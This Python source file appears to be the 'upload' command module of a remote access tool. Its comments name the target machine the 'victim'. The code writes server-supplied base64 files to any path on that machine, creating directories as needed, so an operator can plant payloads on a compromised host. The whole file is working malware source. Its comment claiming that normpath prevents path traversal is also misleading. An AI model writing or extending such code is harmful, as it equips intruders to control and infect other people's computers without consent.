# Upload command - send file from server to client.

import base64
import logging
import os
from typing import Any, Dict

from client.commands.base import BaseCommand
from common.constants import MAX_FILE_SIZE_BYTES

logger = logging.getLogger(__name__)

# Chunk size for writing files (1 MB)
# We decode in chunks to avoid loading entire decoded content in memory
CHUNK_SIZE = 1024 * 1024


class UploadCommand(BaseCommand):
    # Send a file from the server to the client (victim).

    @property
    def name(self) -> str:
        return "upload"

    @property
    def description(self) -> str:
        return "Send file from server to victim"

    def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        # Execute the upload command.
        remote_path = params.get("remote_path")
        content_base64 = params.get("content")

        if not remote_path:
            return self._error_response("Missing required parameter: remote_path")
        if content_base64 is None:
            return self._error_response("Missing required parameter: content")

        # Check file size limit before processing
        # Note: Base64 estimation can round up by 1-3 bytes due to integer division
        if content_base64:
            estimated_size = (len(content_base64) * 3) // 4
            # Allow 3-byte margin for base64 estimation rounding
            if estimated_size > MAX_FILE_SIZE_BYTES + 3:
                return self._error_response(f"File size {estimated_size} exceeds limit {MAX_FILE_SIZE_BYTES}")

        try:
            # Validate and normalize the path (prevent path traversal)
            remote_path = os.path.normpath(remote_path)

            # Estimate decoded size (base64 is ~33% larger than original)
            estimated_size = (len(content_base64) * 3) // 4
            logger.info(f"Uploading file: {remote_path} (~{estimated_size} bytes)")

            # Create parent directories if needed
            parent_dir = os.path.dirname(remote_path)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
                logger.info(f"Created directory: {parent_dir}")

            # Stream base64 decoding to file to avoid loading entire
            # decoded content in memory at once
            bytes_written = 0
            progress_percent = 0

            with open(remote_path, "wb") as f:
                # Read and decode in chunks (must be multiple of 4 for base64)
                # Using larger chunk to reduce iterations but still memory-efficient
                decode_chunk_size = CHUNK_SIZE * 4  # 4MB of base64 at a time
                offset = 0

                while offset < len(content_base64):
                    chunk = content_base64[offset : offset + decode_chunk_size]
                    decoded = base64.b64decode(chunk)
                    f.write(decoded)
                    bytes_written += len(decoded)
                    offset += decode_chunk_size

                    # Log progress at 25% intervals
                    if estimated_size > 0:
                        new_percent = int((bytes_written / estimated_size) * 100)
                        if new_percent >= progress_percent + 25:
                            progress_percent = (new_percent // 25) * 25
                            logger.info(
                                f"Upload progress: {progress_percent}% "
                                f"({bytes_written}/{estimated_size} bytes)"
                            )

            logger.info(f"File upload complete: {remote_path} ({bytes_written} bytes)")

            return {
                "success": True,
                "remote_path": remote_path,
                "size": bytes_written,
                "message": f"Successfully uploaded {remote_path}",
            }

        except base64.binascii.Error as e:
            logger.error(f"Invalid base64 content: {e}")
            return self._error_response(f"Invalid base64 content: {e}")
        except PermissionError as e:
            logger.error(f"Permission denied writing to {remote_path}: {e}")
            return self._error_response(f"Permission denied: {remote_path}")
        except OSError as e:
            logger.error(f"OS error writing to {remote_path}: {e}")
            return self._error_response(f"Error writing file: {e}")

    def _error_response(self, message: str) -> Dict[str, Any]:
        # Create an error response.
        return {
            "success": False,
            "error": message,
        }
